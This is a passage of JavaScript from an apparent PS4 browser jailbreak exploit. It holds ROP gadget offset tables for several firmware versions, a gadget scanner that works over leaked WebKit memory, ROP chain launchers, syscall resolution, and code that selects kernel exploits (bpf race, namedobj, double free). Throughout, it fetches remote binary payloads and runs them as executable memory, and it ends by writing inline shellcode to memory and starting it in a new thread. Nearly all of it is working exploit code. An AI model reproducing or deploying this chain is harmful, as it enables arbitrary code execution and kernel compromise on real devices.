			"memset": o2wk(0x138),
			"memset_offset": 0x37080,
			"setjmp": o2wk(0x2B8),
			"scePthreadCreate": o2lk(0x11E80),
			"mov rdi, [rdi+0x48]": o2lc(0x8E982), // 3.55 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1773B),
			"add rax, [rdi]": o2lc(0x40B58), // 3.55 - 48 03 07 C3
		};
	} else if (fwFromUA == "4.05") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xF0),
			"__stack_chk_fail_offset": 0xD0D0,
			"memcpy": o2wk(0x130),
			"memset": o2wk(0x140),
			"memset_offset": 0x37080,
			"setjmp": o2wk(0x270),
			"scePthreadCreate": o2lk(0x11570),
			"mov rdi, [rdi+0x48]": o2lc(0xA8282), // 4.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1702B),
			"add rax, [rdi]": o2lc(0x58978), // 4.05 - 48 03 07 C3
		};
	} else if (fwFromUA == "4.55") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
			"setjmp": o2wk(0x1468),
			"scePthreadCreate": o2lk(0x115C0),
			"mov rdi, [rdi+0x48]": o2lc(0xA1262), // 4.55-4.74 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1760B),
			"add rax, [rdi]": o2lc(0x4C418), // 4.55-4.74 - 48 03 07 C3
		};
	} else if (fwFromUA == "4.74") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
			"setjmp": o2wk(0x1468),
			"scePthreadCreate": o2lk(0x115C0),
			"mov rdi, [rdi+0x48]": o2lc(0xA1262), // 4.55-4.74 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1789B),
			"add rax, [rdi]": o2lc(0x4C418), // 4.55-4.74 - 48 03 07 C3
		};
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01" || fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0x11EC0,
			"memcpy": o2wk(0xF8),
			"memset": o2wk(0x228),
			"memset_offset": 0x225E0,
			"setjmp": o2wk(0x14F8),
			"scePthreadCreate": o2lk(0x98C0),
			"mov rdi, [rdi+0x48]": o2lc(0xB00F2), // 5.05 - 48 8B 7F 48 C3
			"sub rax, rcx": o2lk(0x1EADB), // 5.05 - 48 29 C8 C3
			"add rax, [rdi]": o2lc(0x44DB8), // 5.05 - 48 03 07 C3
		};
	}
	
	
	var wkview = new Uint8Array(0x1000);
	var wkstr = p.leakval(wkview).add32(window.leakval_slide);
	var orig_wkview_buf = p.read8(wkstr);

	p.write8(wkstr, webKitBase);
	//p.write4(wkstr.add32(8), 0x367c000);
	p.write4(wkstr.add32(8), 0x3052D38);

	var gadgets_to_find = 0;
	var gadgetnames = [];
	for (var gadgetname in gadgetmap_wk) {
		if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
			gadgets_to_find++;
			gadgetnames.push(gadgetname);
			gadgetmap_wk[gadgetname].reverse();
		}
	}

	gadgets_to_find++;

	var findgadget = function (donecb) {
		if (gadgetcache) {
			gadgets_to_find = 0;
			slowpath_jop = 0;
			for (var gadgetname in gadgetcache) {
				if (gadgetcache.hasOwnProperty(gadgetname))
					gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
			}
		} else {
			for (var i = 0; i < wkview.length; i++) {
				if (wkview[i] == 0xc3) {
					for (var nl = 0; nl < gadgetnames.length; nl++) {
						var found = 1;
						if (!gadgetnames[nl])
							continue;
						var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
						for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
							if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
								found = 0;
								break;
							}
						}
						if (!found)
							continue;
						gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
						gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
						delete gadgetnames[nl];
						gadgets_to_find--;
					}
				} else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
					var found = 1;
					for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
						if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
							found = 0;
							break;
						}
					}
					if (!found)
						continue;
					gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
					gadgetoffs["jop"] = i - slowpath_jop.length + 1;
					gadgets_to_find--;
					slowpath_jop = 0;
				}
				if (!gadgets_to_find)
					break;
			}
		}
		if (!gadgets_to_find && !slowpath_jop)
			setTimeout(donecb, 50);
		else {
			print("missing gadgets: ");
			for (var nl in gadgetnames)
				print(" - " + gadgetnames[nl]);
			if (slowpath_jop)
				print(" - jop gadget");
		}
	}
	alert("find");
	findgadget(function () { });
	
	if (window.ps4_fw <= 407) {
		
      var funcPtrStore = p.leakfunc(parseFloat);
      var funcArgs = [];

      for (var i = 0; i < 0x7FFF; i++)
        funcArgs[i] = 0x41410000 | i;

      /* Ensure everything is aligned and the layout is intact */
      var argBuffer = new Uint32Array(0x1000);
      var argPointer = p.read8(p.leakval(argBuffer).add32(window.leakval_slide));
      argBuffer[0] = 0x13371337;

      if (p.read4(argPointer) != 0x13371337)
        throw new Error("Stack frame is not aligned!");

      window.dont_tread_on_me = [argBuffer];

      /* Load ROP chain into memory */
      var launch_chain = function (chain) {
        var stackPointer = 0;
        var stackCookie = 0;
        var orig_reenter_rip = 0;

        var reenter_help = {
          length: {
            valueOf: function() {
              orig_reenter_rip = p.read8(stackPointer);
			  stackCookie = p.read8(stackPointer.add32(8));
              var returnToFrame = stackPointer;

              var ocnt = chain.count;
              chain.push_write8(stackPointer, orig_reenter_rip);
              chain.push_write8(stackPointer.add32(8), stackCookie);

              if (chain.runtime)
				  returnToFrame = chain.runtime(stackPointer);

              chain.push(window.gadgets["pop rsp"]);
              chain.push(returnToFrame); // -> back to the trap life
              chain.count = ocnt;

              p.write8(stackPointer, window.gadgets["pop rsp"]);
              p.write8(stackPointer.add32(8), chain.stackBase);
            }
          }
        };

        return (function() {
          /* Clear stack frame */
          (function(){}).apply(null, funcArgs);

          /* Recover frame */
          var orig = p.read8(funcPtrStore);
          p.write8(funcPtrStore, window.gadgets["mov rax, rdi"]);

          /* Setup frame */
          var trap = p.leakval(parseFloat());
          var rtv = 0;
          var fakeval = new int64(0x41414141, 0xffff0000);

          (function() {
            var val = p.read8(trap.add32(0x100));
            if ((val.hi != 0xffff0000) || ((val.low & 0xFFFF0000) != 0x41410000))
              throw new Error("Stack frame corrupted!");
          }).apply(null, funcArgs);

          /* Write vtable, setjmp stub, and 'jmp rax' gadget */
          p.write8(argPointer, argPointer.add32(0x100));
          p.write8(argPointer.add32(0x130), window.gadgets["setjmp"]);
          p.write8(funcPtrStore, window.gadgets["jop"]);

          /* Clear and write to frame */
          (function(){}).apply(null, funcArgs);
          p.write8(trap.add32(0x18), argPointer);
          p.leakval(parseFloat()); // Jumps to "setjmp" function stub in libkernel

          /* Finish by resetting the stack's base pointer and canary */
          stackPointer = p.read8(argPointer.add32(0x10));

          rtv = Array.prototype.splice.apply(reenter_help);
          p.write8(trap.add32(0x18), fakeval);
          p.write8(trap.add32(0x18), orig);

          return p.leakval(rtv);
        }).apply(null, funcArgs);
      }
	} else {
		
		var hold1;
		var hold2;
		var holdz;
		var holdz1;

		while (1) {
			hold1 = { a: 0, b: 0, c: 0, d: 0 };
			hold2 = { a: 0, b: 0, c: 0, d: 0 };
			holdz1 = p.leakval(hold2);
			holdz = p.leakval(hold1);
			if (holdz.low - 0x30 == holdz1.low)
				break;
		}

		var pushframe = [];
		pushframe.length = 0x80;
		var rtv = 0;
		var funcbuf;
		var funcbuf32 = new Uint32Array(0x100);
		nogc.push(funcbuf32);

		var launch_chain = function (chain) {
			var stackPointer = 0;
			var stackCookie = 0;
			var orig_reenter_rip = 0;

			var reenter_help = {
				length: {
					valueOf: function () {
						orig_reenter_rip = p.read8(stackPointer);
						stackCookie = p.read8(stackPointer.add32(8));
						var returnToFrame = stackPointer;

						var ocnt = chain.count;
						chain.push_write8(stackPointer, orig_reenter_rip);
						chain.push_write8(stackPointer.add32(8), stackCookie);

						if (chain.runtime)
							returnToFrame = chain.runtime(stackPointer);

						chain.push(gadgets["pop rsp"]);
						chain.push(returnToFrame); // -> back to the trap life
						chain.count = ocnt;

						p.write8(stackPointer, gadgets["pop rsp"]);
						p.write8(stackPointer.add32(8), chain.stackBase);
					}
				}
			};
			
			funcbuf = p.read8(p.leakval(funcbuf32).add32(window.leakval_slide));

			p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
			p.write8(funcbuf.add32(0x80), gadgets["jop"]);
			p.write8(funcbuf, funcbuf);
			p.write8(parseFloatStore, gadgets["jop"]);
			var orig_hold = p.read8(holdz1);
			var orig_hold48 = p.read8(holdz1.add32(0x48));

			p.write8(holdz1, funcbuf.add32(0x50));
			p.write8(holdz1.add32(0x48), funcbuf);
			parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
			p.write8(holdz1, orig_hold);
			p.write8(holdz1.add32(0x48), orig_hold48);

			stackPointer = p.read8(funcbuf.add32(0x10));
			rtv = Array.prototype.splice.apply(reenter_help);
			return p.leakval(rtv);
		}

	}
	
	p.loadchain = launch_chain;

	//alert("resolving syscalls");
	if (window.ps4_fw <= 407) {
		/* Get syscall map based on firmware from user-agent string */
		if (syscallMap[fwFromUA] != null) {
			window.syscalls = syscallMap[fwFromUA];
			for (var syscallno in window.syscalls) {
				if (window.syscalls.hasOwnProperty(syscallno)) {
					window.syscalls[syscallno] = o2lk(window.syscalls[syscallno]);
					//alert(window.syscalls[syscallno]);
					//alert(p.read8(window.syscalls[syscallno]));
				}
			}
		}
		else
			alert("Your system SW version does not have a valid syscall map! The exploit will still work but calling syscalls will not function properly...");
	} else {
		var kview = new Uint8Array(0x1000);
		var kstr = p.leakval(kview).add32(window.leakval_slide);
		var orig_kview_buf = p.read8(kstr);

		p.write8(kstr, window.libKernelBase);
		p.write4(kstr.add32(8), 0x40000);
		
		var countbytes;
		for (var i = 0; i < 0x40000; i++) {
			if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
				countbytes = i;
				break;
			}
		}
		p.write4(kstr.add32(8), countbytes + 32);

		var dview32 = new Uint32Array(1);
		var dview8 = new Uint8Array(dview32.buffer);
		for (var i = 0; i < countbytes; i++) {
			if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
				dview8[0] = kview[i + 3];
				dview8[1] = kview[i + 4];
				dview8[2] = kview[i + 5];
				dview8[3] = kview[i + 6];
				var syscallno = dview32[0];
				window.syscalls[syscallno] = window.libKernelBase.add32(i);
			}
		}
	}
	
	var chain = new window.rop;
	var returnvalue;
	
	p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
		chain.clear();

		chain.notimes = this.next_notime;
		this.next_notime = 1;

		chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

		chain.push(window.gadgets["pop rdi"]);
		chain.push(chain.stackBase.add32(0x3ff8));
		chain.push(window.gadgets["mov [rdi], rax"]);

		chain.push(window.gadgets["pop rax"]);
		chain.push(p.leakval(0x41414242));
		
		if (chain.run().low != 0x41414242)
			throw new Error("unexpected rop behaviour");
		returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
	}

	p.fcall = function () {
		var rv = p.fcall_.apply(this, arguments);
		return returnvalue;
	}

	p.writestr = function (addr, str) {
		for (var i = 0; i < str.length; i++) {
			var byte_ = p.read4(addr.add32(i));
			byte_ &= 0xFFFF0000;
			byte_ |= str.charCodeAt(i);
			p.write4(addr.add32(i), byte_);
		}
	}
	
	p.readstr = function (addr) {
		var addr_ = addr.add32(0);
		var rd = p.read4(addr_);
		var buf = "";
		while (rd & 0xFF) {
			buf += String.fromCharCode(rd & 0xFF);
			addr_.add32inplace(1);
			rd = p.read4(addr_);
		}
		return buf;
	}

	p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
		if (typeof sysc == "string")
			sysc = window.syscallnames[sysc];
			
		if (typeof sysc != "number")
			throw new Error("invalid syscall");

		var off = window.syscalls[sysc];
		if (off == undefined)
			throw new Error("undefined syscall number: " + sysc);

		return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
	}

	p.stringify = function (str) {
		var bufView = new Uint8Array(str.length + 1);
		for (var i = 0; i < str.length; i++)
			bufView[i] = str.charCodeAt(i) & 0xFF;
		window.nogc.push(bufView);
		return p.read8(p.leakval(bufView).add32(window.leakval_slide));
	};

	p.malloc = function malloc(sz) {
		var backing = new Uint8Array(0x10000 + sz);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(window.leakval_slide));
		ptr.backing = backing;
		return ptr;
	}

	p.malloc32 = function malloc32(sz) {
		var backing = new Uint8Array(0x10000 + sz * 4);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(window.leakval_slide));
		ptr.backing = new Uint32Array(backing.buffer);
		return ptr;
	}
	
	p.socket = function() {
		return p.syscall('sys_socket', 2, 1, 0); // 2 = AF_INET, 1 = SOCK_STREAM, 0 = TCP
	}

	p.connectSocket = function(s, ip, port) {
		var sockAddr = new Uint32Array(0x10);
		var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(window.leakval_slide));
		var ipSegments = ip.split('.');
		
		for (var seg = 0; seg < 4; seg++)
			ipSegments[seg] = parseInt(ipSegments[seg]);
		
		sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
		sockAddr[1] = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
		sockAddr[2] = 0;
		sockAddr[3] = 0;
		
		return p.syscall('sys_connect', s, sockAddrPtr, 0x10);
	}
	
	p.writeSocket = function(s, data, size) {
		return p.syscall('sys_write', s, data, size);
	}
	
	p.closeSocket = function(s) {
		return p.syscall('sys_close', s);
	}
	
	window.spawnthread = function (chain) {
		var contextp = p.malloc32(0x1800);
		var contextz = contextp.backing;
		contextz[0] = 1337;
		var thread2 = new window.rop();
		//thread2.clear(); // maybe not needed
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		chain(thread2); // re-enter into |chain| which will set up thread chain
		p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget -  longjmp will return into this
		p.write8(contextp.add32(0x10), thread2.stackBase); // rsp - longjmp pivots RSP to this, invoking the just created chain
		p.syscall("sys_mlockall", 1);
		//p.fcall(window.gadgets["createThread"], window.gadgets["longjmp"], contextp, p.stringify("GottaGoFast"));
		var thread = p.malloc(0x08);
		p.fcall(window.gadgets["scePthreadCreate"], thread, 0, window.gadgets["longjmp"], contextp, p.stringify("GottaGoFast"));
		window.nogc.push(contextp); // never free()
		window.nogc.push(thread2);
		return thread2;
	}

	window.runPayload = function (path) {
		var req = new XMLHttpRequest();
		req.open('GET', path);
		req.responseType = "arraybuffer";
		req.onreadystatechange = function () {
			if (req.readyState === 4) {
				try {
					var code_addr = new int64(0x26100000, 0x00000009);
					var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
					if (mapped_address != '926100000')
						throw "sys_mmap failed";
					
					// Trick for 4 bytes padding
					var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
					var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
					tmp.set(new Uint8Array(req.response), 0);
					tmp.set(padding, req.response.byteLength);
					
					var shellcode = new Uint32Array(tmp.buffer);
					for (var i=0; i < shellcode.length; i++)
						p.write4(code_addr.add32(0x100000 + i * 4), shellcode[i]);
					p.fcall(code_addr);
					p.syscall("sys_munmap", code_addr, 0x300000);
				} catch (e) {
					alert("exception: " + e);
				}
			}
		};
		sleep(1000);
		req.send();
		sleep(3000);
	};

	window.trydlsym = function() {
		var scratch32 = new Uint32Array(0x400);
		var scratch = p.read8(p.leakval(scratch32).add32(window.leakval_slide));
		var module_id = p.syscall("sys_dynlib_load_prx", p.stringify("libkernel_web.sprx"), 0, scratch, 0);
		alert("ret: " + module_id + ", scratch: " + p.read8(scratch));
		//var sym = p.syscall(591, p.read8(scratch), p.stringify("sceSystemServiceLaunchWebBrowser"), scratch);
		var sym = p.syscall("sys_dynlib_dlsym", p.read8(scratch), p.stringify("sceKernelLoadStartModule"), scratch);
		alert("ret: " + sym + ", scratch: " + p.read8(scratch));
		alert(p.fcall(p.read8(scratch), p.stringify("libkernel_web.sprx"), 0, scratch.add32(0x40), 0, 0, 0));
	};
	
	if (p.fcall(window.gadgets["mov rax, rdi"], 0x41414141) != 41414141)
		alert("userland ROP execution not working");
	
	//if (window.ps4_fw == 405)
	//	alert(getKernelBase_namedobj());

    alert("devkit = " + devkit);	

    var isDoExploit = false;

	// Test if the kernel is already patched
	if (p.syscall("sys_setuid", 0) != 0) {
		alert("Launching kexploit");
        isDoExploit = true;
		if (window.ps4_fw <= 370)
			kernExploit_bpf_race_old();
		else if (window.ps4_fw <= 407)
			kernExploit_namedobj();
		else if (window.ps4_fw <= 455)
			kernExploit_bpf_race();
		else if (window.ps4_fw <= 507)
			kernExploit_bpf_double_free();
	} else alert("Kexploit has already been ran. Continuing.");
	// Kernel patched, launch cool stuff
	
	alert("kernel done");
	//sleep(500);
	var runPayload = window.runPayload;
	
    if (isDoExploit)
    {
       while (1)
       {
            alert("Please close and restart the browser before proceed");
       }
    }

	// Check mira status
	var testMira = p.syscall("sys_setlogin", p.stringify("root"));
	if (testMira == '0')
		alert("Mira is loaded");
	
	//trydlsym();
	
	if (fwFromUA == "5.05") {
		//runPayload("kdumper.bin");
		//runPayload("ps4-hen-vtx-505.bin");
		//runPayload("unblocker.bin");
		
		/*
		sleep(2000);
		runPayload("mira_505.bin");
		sleep(2000);
		// Test if payloads ran successfully, if not, refresh
		testMira = p.syscall("sys_setlogin", p.stringify("root"));
		if (testMira != '0') {
			alert("Mira failed to run !");
			//location.reload();
		}
		*/
		
        runPayload("ps4-ftp-vtx-master-devkit.bin");

		allset();
	} else if (fwFromUA == "4.74") {
		//runPayload("kdumper.bin");
		//runPayload("fake_installer.bin");
		//runPayload("unblocker.bin");
		
		allset();
	} else if (fwFromUA == "4.555") {
		//runPayload("kdumper.bin");
		//runPayload("ps4-hen-vtx-455.bin");
		//runPayload("unblocker.bin");
		
		allset();
	} else if (window.ps4_fw <= 107) {
		//alert("Manual payload");
		//runPayload("kdumper.bin");
		//runPayload("ps4-hen-vtx-455.bin");
		//runPayload("unblocker.bin");
		
		allset();
	} else {
		// Load payload launcher
		var code_addr = new int64(0x26100000, 0x00000009);
		var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
		if (mapped_address == '926100000') {
			try {
				var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
				var shellbuf = p.malloc32(0x1000);
				for (var i = 0; i < shcode.length; i++)
					shellbuf.backing[i] = shcode[i];
				p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
				//p.fcall(window.gadgets["createThread"], shellbuf, 0, p.stringify("loader"));
				var thread_id = p.malloc(0x08);
				p.fcall(window.gadgets["scePthreadCreate"], thread_id, 0, shellbuf, 0, p.stringify("loader"));
				awaitpl(); // Awaiting payload message
			} catch (e) { alert(e); }
		}
	}
}
